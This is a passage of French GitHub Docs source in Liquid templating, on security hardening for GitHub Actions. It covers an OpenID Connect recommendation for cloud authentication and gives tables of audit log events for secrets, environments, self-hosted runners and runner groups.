  - Vous pouvez également ajouter des exécuteurs au niveau du dépôt, mais cela ajoute une surcharge de gestion et augmente aussi le nombre d’exécuteurs dont vous avez besoin, car vous ne pouvez pas les partager entre les dépôts.

{% ifversion fpt or ghec or ghes > 3.4 %}
### Authentification auprès de votre fournisseur de cloud

Si vous utilisez {% data variables.product.prodname_actions %} pour effectuer un déploiement sur un fournisseur de cloud ou si vous envisagez d’utiliser HashiCorp Vault pour la gestion des secrets, il est recommandé d’utiliser OpenID Connect pour créer des jetons d’accès de courte durée et bien limités pour vos exécutions de workflow. Pour plus d’informations, consultez « [À propos du durcissement de la sécurité avec OpenID Connect](/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect) ».

{% endif %}

## Audit des événements {% data variables.product.prodname_actions %}

Vous pouvez utiliser le journal d’audit pour superviser les tâches administratives dans une organisation. Le journal d’audit enregistre le type d’action, quand elle a été exécutée ainsi que le compte personnel qui a effectué l’action.

Par exemple, vous pouvez utiliser le journal d’audit pour suivre l’événement `org.update_actions_secret`, qui suit les modifications apportées aux secrets de l’organisation : ![Entrées du journal d’audit](/assets/images/help/repository/audit-log-entries.png)

Les tableaux suivants décrivent les événements {% data variables.product.prodname_actions %} que vous pouvez trouver dans le journal d’audit. Pour plus d’informations sur l’utilisation du journal d’audit, consultez « [Examen du journal d’audit pour votre organisation](/organizations/keeping-your-organization-secure/reviewing-the-audit-log-for-your-organization#searching-the-audit-log) » et « [Examen des journaux d’audit pour votre entreprise](/admin/monitoring-activity-in-your-enterprise/reviewing-audit-logs-for-your-enterprise) ».

{% ifversion fpt or ghec %}
### Événements pour les environnements

| Action | Description
|------------------|-------------------
| `environment.create_actions_secret` | Déclenchée lorsqu’un secret est créé dans un environnement. Pour plus d’informations, consultez [« Secrets d’environnement »](/actions/reference/environments#environment-secrets).
| `environment.delete` | Déclenchée lorsqu’un environnement est supprimé. Pour plus d’informations, consultez [« Suppression d’un environnement »](/actions/reference/environments#deleting-an-environment).
| `environment.remove_actions_secret` |  Déclenchée lorsqu’un secret est supprimé d’un environnement. Pour plus d’informations, consultez [« Secrets d’environnement »](/actions/reference/environments#environment-secrets).
| `environment.update_actions_secret` | Déclenchée lorsqu’un secret dans un environnement est mis à jour. Pour plus d’informations, consultez [« Secrets d’environnement »](/actions/reference/environments#environment-secrets).
{% endif %}

{% ifversion fpt or ghes or ghec %}
### Événements pour les modifications de configuration
| Action | Description
|------------------|-------------------
| `repo.actions_enabled` | Déclenchée lorsque {% data variables.product.prodname_actions %} est activé pour un dépôt. Visible à l’aide de l’interface utilisateur. Cet événement n’est pas visible lorsque vous accédez au journal d’audit à l’aide de l’API REST. Pour plus d’informations, consultez « [Utilisation de l’API REST](#using-the-rest-api) ».
| `repo.update_actions_access_settings` | Déclenchée lorsque le paramètre permettant de contrôler l’utilisation de votre dépôt par les workflows {% data variables.product.prodname_actions %} dans d’autres dépôts est modifié.
{% endif %}

### Événements pour la gestion des secrets
| Action | Description
|------------------|-------------------
| `org.create_actions_secret` | Déclenchée lorsqu’un secret {% data variables.product.prodname_actions %} est créé pour une organisation. Pour plus d’informations, consultez « [Création de secrets chiffrés pour une organisation](/actions/reference/encrypted-secrets#creating-encrypted-secrets-for-an-organization) ».
| `org.remove_actions_secret` | Déclenchée lorsqu’un secret {% data variables.product.prodname_actions %} est supprimé.
| `org.update_actions_secret` | Déclenchée lorsqu’un secret {% data variables.product.prodname_actions %} est mis à jour.
| `repo.create_actions_secret ` | Déclenchée lorsqu’un secret {% data variables.product.prodname_actions %} est créé pour un dépôt. Pour plus d’informations, consultez « [Création de secrets chiffrés pour un dépôt](/actions/reference/encrypted-secrets#creating-encrypted-secrets-for-a-repository) ».
| `repo.remove_actions_secret` | Déclenchée lorsqu’un secret {% data variables.product.prodname_actions %} est supprimé.
| `repo.update_actions_secret` | Déclenchée lorsqu’un secret {% data variables.product.prodname_actions %} est mis à jour.

### Événements pour les exécuteurs auto-hébergés
| Action | Description
|------------------|-------------------
| `enterprise.register_self_hosted_runner` | Déclenchée lorsqu’un nouvel exécuteur auto-hébergé est inscrit. Pour plus d’informations, consultez « [Ajout d’un exécuteur auto-hébergé à une entreprise](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-an-enterprise) ».
| `enterprise.remove_self_hosted_runner` | Déclenchée lorsqu’un exécuteur auto-hébergé est supprimé.
| `enterprise.runner_group_runners_updated` | Déclenchée lors de la mise à jour de la liste des membres d’un groupe d’exécuteurs. Pour plus d’informations, consultez « [Définir des exécuteurs auto-hébergés dans un groupe pour une organisation](/rest/reference/actions#set-self-hosted-runners-in-a-group-for-an-organization) ».
| `enterprise.self_hosted_runner_online` | Déclenchée lorsque l’application de l’exécuteur est démarrée. Visible uniquement à l’aide de l’API REST ; non visible dans l’interface utilisateur ni l’exportation JSON/CSV. Pour plus d’informations, consultez « [Vérification de l’état d’un exécuteur auto-hébergé](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner) ».
| `enterprise.self_hosted_runner_offline` | Déclenchée lorsque l’application de l’exécuteur est arrêtée. Visible uniquement à l’aide de l’API REST ; non visible dans l’interface utilisateur ni l’exportation JSON/CSV. Pour plus d’informations, consultez « [Vérification de l’état d’un exécuteur auto-hébergé](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner) ».
| `enterprise.self_hosted_runner_updated` | Déclenchée lorsque l’application de l’exécuteur est mise à jour. Visible à l’aide de l’API REST et de l’interface utilisateur. Cet événement n’est pas inclus lorsque vous exportez le journal d’audit en tant que données JSON ou fichier CSV. Pour plus d’informations, consultez « [À propos des exécuteurs auto-hébergés](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners) » et « [Examen du journal d’audit de votre organisation](/organizations/keeping-your-organization-secure/reviewing-the-audit-log-for-your-organization#exporting-the-audit-log) ».
| `org.register_self_hosted_runner` | Déclenchée lorsqu’un nouvel exécuteur auto-hébergé est inscrit. Pour plus d’informations, consultez « [Ajout d’un exécuteur auto-hébergé à une organisation](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-an-organization) ».
| `org.remove_self_hosted_runner` | Déclenchée lorsqu’un exécuteur auto-hébergé est supprimé. Pour plus d’informations, consultez « [Suppression d’un exécuteur d’une organisation](/actions/hosting-your-own-runners/removing-self-hosted-runners#removing-a-runner-from-an-organization) ».
| `org.runner_group_runners_updated` | Déclenchée lors de la mise à jour de la liste des membres d’un groupe d’exécuteurs. Pour plus d’informations, consultez « [Définir des exécuteurs auto-hébergés dans un groupe pour une organisation](/rest/reference/actions#set-self-hosted-runners-in-a-group-for-an-organization) ».
| `org.runner_group_updated` | Déclenchée lorsque la configuration d’un groupe d’exécuteurs auto-hébergés est modifiée. Pour plus d’informations, consultez « [Modification de la stratégie d’accès d’un groupe d’exécuteurs auto-hébergés](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group) ».
| `org.self_hosted_runner_online` | Déclenchée lorsque l’application de l’exécuteur est démarrée. Visible uniquement à l’aide de l’API REST ; non visible dans l’interface utilisateur ni l’exportation JSON/CSV. Pour plus d’informations, consultez « [Vérification de l’état d’un exécuteur auto-hébergé](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner) ».
| `org.self_hosted_runner_offline` | Déclenchée lorsque l’application de l’exécuteur est arrêtée. Visible uniquement à l’aide de l’API REST ; non visible dans l’interface utilisateur ni l’exportation JSON/CSV. Pour plus d’informations, consultez « [Vérification de l’état d’un exécuteur auto-hébergé](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner) ».
| `org.self_hosted_runner_updated` | Déclenchée lorsque l’application de l’exécuteur est mise à jour. Visible à l’aide de l’API REST et de l’interface utilisateur ; non visible dans l’exportation JSON/CSV. Pour plus d’informations, consultez « [About self-hosted runners](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners) ».
| `repo.register_self_hosted_runner` | Déclenchée lorsqu’un nouvel exécuteur auto-hébergé est inscrit. Pour plus d’informations, consultez « [Ajout d’un exécuteur auto-hébergé à un dépôt](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-a-repository) ».
| `repo.remove_self_hosted_runner` | Déclenchée lorsqu’un exécuteur auto-hébergé est supprimé. Pour plus d’informations, consultez « [Suppression d’un exécuteur d’un dépôt](/actions/hosting-your-own-runners/removing-self-hosted-runners#removing-a-runner-from-a-repository) ».
| `repo.self_hosted_runner_online` | Déclenchée lorsque l’application de l’exécuteur est démarrée. Visible uniquement à l’aide de l’API REST ; non visible dans l’interface utilisateur ni l’exportation JSON/CSV. Pour plus d’informations, consultez « [Vérification de l’état d’un exécuteur auto-hébergé](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner) ».
| `repo.self_hosted_runner_offline` | Déclenchée lorsque l’application de l’exécuteur est arrêtée. Visible uniquement à l’aide de l’API REST ; non visible dans l’interface utilisateur ni l’exportation JSON/CSV. Pour plus d’informations, consultez « [Vérification de l’état d’un exécuteur auto-hébergé](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner) ».
| `repo.self_hosted_runner_updated` | Déclenchée lorsque l’application de l’exécuteur est mise à jour. Visible à l’aide de l’API REST et de l’interface utilisateur ; non visible dans l’exportation JSON/CSV. Pour plus d’informations, consultez « [About self-hosted runners](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners) ».

### Événements pour les groupes d’exécuteurs auto-hébergés
| Action | Description
|------------------|-------------------
| `enterprise.runner_group_created` | Déclenchée lorsqu’un groupe d’exécuteurs auto-hébergés est créé. Pour plus d’informations, consultez « [Création d’un groupe d’exécuteurs auto-hébergés pour une entreprise](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#creating-a-self-hosted-runner-group-for-an-enterprise) ».
| `enterprise.runner_group_removed` | Déclenchée lorsqu’un groupe d’exécuteurs auto-hébergés est supprimé. Pour plus d’informations, consultez « [Suppression d’un groupe d’exécuteurs auto-hébergés](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#removing-a-self-hosted-runner-group) ».
| `enterprise.runner_group_runner_removed` | Déclenchée lorsque l’API REST est utilisée pour supprimer un exécuteur auto-hébergé d’un groupe.
| `enterprise.runner_group_runners_added` | Déclenchée lorsqu’un exécuteur auto-hébergé est ajouté à un groupe. Pour plus d’informations, consultez « [Déplacement d’un exécuteur auto-hébergé vers un groupe](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#moving-a-self-hosted-runner-to-a-group) ».
| `enterprise.runner_group_updated` |Déclenchée lorsque la configuration d’un groupe d’exécuteurs auto-hébergés est modifiée. Pour plus d’informations, consultez « [Modification de la stratégie d’accès d’un groupe d’exécuteurs auto-hébergés](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group) ».
| `org.runner_group_created` | Déclenchée lorsqu’un groupe d’exécuteurs auto-hébergés est créé. Pour plus d’informations, consultez « [Création d’un groupe d’exécuteurs auto-hébergés pour une organisation](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#creating-a-self-hosted-runner-group-for-an-organization) ».
| `org.runner_group_removed` | Déclenchée lorsqu’un groupe d’exécuteurs auto-hébergés est supprimé. Pour plus d’informations, consultez « [Suppression d’un groupe d’exécuteurs auto-hébergés](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#removing-a-self-hosted-runner-group) ».
| `org.runner_group_updated` | Déclenchée lorsque la configuration d’un groupe d’exécuteurs auto-hébergés est modifiée. Pour plus d’informations, consultez « [Modification de la stratégie d’accès d’un groupe d’exécuteurs auto-hébergés](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group) ».
| `org.runner_group_runners_added` | Déclenchée lorsqu’un exécuteur auto-hébergé est ajouté à un groupe. Pour plus d’informations, consultez « [Déplacement d’un exécuteur auto-hébergé vers un groupe](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#moving-a-self-hosted-runner-to-a-group) ».
| `org.runner_group_runner_removed` | Déclenchée lorsque l’API REST est utilisée pour supprimer un exécuteur auto-hébergé d’un groupe. Pour plus d’informations, consultez « [Supprimer un exécuteur auto-hébergé d’un groupe pour une organisation](/rest/reference/actions#remove-a-self-hosted-runner-from-a-group-for-an-organization) ».

### Événements pour les activités de workflow

{% data reusables.actions.actions-audit-events-workflow %}
